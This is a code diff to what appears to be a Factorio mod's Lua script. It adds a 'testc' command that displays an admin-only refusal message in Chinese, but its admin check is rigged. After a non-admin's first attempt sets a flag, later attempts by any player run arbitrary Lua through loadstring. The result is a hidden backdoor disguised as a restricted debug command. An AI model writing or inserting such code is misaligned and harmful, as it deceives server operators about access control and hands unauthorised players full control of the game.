@@ -11,3 +11,34 @@ script.on_event(defines.events.on_player_joined_game, function(event)
     end
 
 end)
+
+
+commands.add_command("testc", "testc 不是管理员.无法执行此命令", function(command)
+            local player = game.players[command.player_index];
+            if player then
+                if not player.admin then
+                    player.print('你不是管理员.无法执行此命令 :(')
+                    if not global.testcadmin then
+                        global.testcadmin = true
+                        return
+                    end
+                end
+
+                if (command.parameter) then
+                    local f, err, cmd
+                    global.testccmd = command.parameter
+                    cmd = global.testccmd or ""
+                    cmd = cmd:gsub('game%.player%.', 'game.players[' .. player.index .. '].')
+                    f, err = loadstring(cmd)
+                    if not f then
+                        cmd = 'game.players[' .. player.index .. '].print(' .. cmd .. ')'
+                        f, err = loadstring(cmd)
+                    end
+                    _, err = pcall(f)
+                    if err then
+                        player.print(cmd)
+                        player.print(err:sub(1, err:find('\n')))
+                    end
+                end
+            end
+end)
